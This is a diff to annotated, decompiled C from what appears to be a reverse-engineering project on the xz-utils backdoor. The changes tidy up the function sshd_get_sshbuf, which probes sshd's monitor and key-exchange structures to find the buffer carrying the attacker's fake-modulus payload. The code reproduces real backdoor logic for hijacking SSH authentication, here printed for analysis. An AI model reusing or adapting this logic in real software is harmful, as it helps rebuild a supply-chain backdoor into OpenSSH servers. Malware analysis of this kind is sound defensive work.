@@ -10,15 +10,16 @@
  * known slot or brute-forces the pkex array when offsets are unknown. Every candidate goes through `sshbuf_extract`; two buffers
  * must decode to the SSH banner string IDs before the third is accepted as the negative bignum carrying the fake modulus.
  */
+
 #include "xzre_types.h"
 
 BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
 
 {
   kex *pkex_table_end;
-  char pkex_slot_index;
-  byte size_index;
-  byte data_index;
+  sbyte pkex_slot_index;
+  sbyte size_index;
+  sbyte data_index;
   monitor *monitor_ptr;
   BOOL probe_ok;
   EncodedStringId banner_id;
@@ -37,14 +38,14 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
     monitor_ptr = *ctx->monitor_struct_slot;
     probe_ok = is_range_mapped((u8 *)monitor_ptr,0x20,ctx);
     if (probe_ok != FALSE) {
-      pkex_slot_index = *(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 1);
+      pkex_slot_index = (ctx->sshd_offsets).bytes.monitor_pkex_table_dword_index;
       // AutoDoc: Start from the in-struct pkex table pointer; when the offsets cache supplies an override we follow that instead.
       pkex_table = monitor_ptr->pkex_table;
       if (-1 < pkex_slot_index) {
         pkex_table = *(kex ***)((long)&monitor_ptr->child_to_monitor_fd + (long)((int)pkex_slot_index << 2));
       }
-      size_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
-      data_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
+      size_index = (ctx->sshd_offsets).bytes.sshbuf_size_qword_index;
+      data_index = (ctx->sshd_offsets).bytes.sshbuf_data_qword_index;
       pkex_entry_span = 0x48;
       // AutoDoc: When both qword indices are known, derive byte offsets so the later field probes land on the remapped struct layout.
       if (-1 < (char)(data_index & size_index)) {
@@ -58,7 +59,7 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
       probe_ok = is_range_mapped((u8 *)pkex_table,8,ctx);
       if ((probe_ok != FALSE) &&
          (probe_ok = is_range_mapped(&(*pkex_table)->opaque,0x400,ctx), probe_ok != FALSE)) {
-        pkex_slot_index = *(char *)&(ctx->sshd_offsets).field0_0x0;
+        pkex_slot_index = (ctx->sshd_offsets).bytes.kex_sshbuf_qword_index;
         pkex_cursor = *pkex_table;
         if (pkex_slot_index < '\0') {
           banner_hits = 0;
